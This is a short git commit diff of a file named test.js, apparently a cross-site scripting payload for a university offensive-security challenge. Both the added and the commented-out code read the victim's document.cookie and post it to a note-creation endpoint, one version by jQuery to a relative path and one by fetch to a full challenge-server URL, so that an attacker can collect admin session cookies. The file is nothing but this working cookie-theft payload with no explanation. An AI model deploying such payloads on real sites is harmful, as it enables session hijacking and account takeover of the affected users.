70c6ae4335a9022e34d21aed833fa40579f7eaa6
comedian <machiavell.ian.means@protonmail.com>
2023-02-07 20:44:42 -0500

    test

--- test.js
+++ test.js
@@ -1,9 +1,12 @@
-const data = new FormData()
-data.append("title", "admin cookies")
-data.append("content", document.cookie)
-data.append("submit", "save")
+$.post('/note/new',{title: document.cookie, content: document.cookie})
+        
 
-fetch("http://offsec-chalbroker.osiris.cyber.nyu.edu:12345/note/new", {
-  method: "POST",
-  body: data,
-})
+// const data = new FormData()
+// data.append("title", "admin cookies")
+// data.append("content", document.cookie)
+// data.append("submit", "save")
+// 
+// fetch("http://offsec-chalbroker.osiris.cyber.nyu.edu:12345/note/new", {
+//   method: "POST",
+//   body: data,
+// })
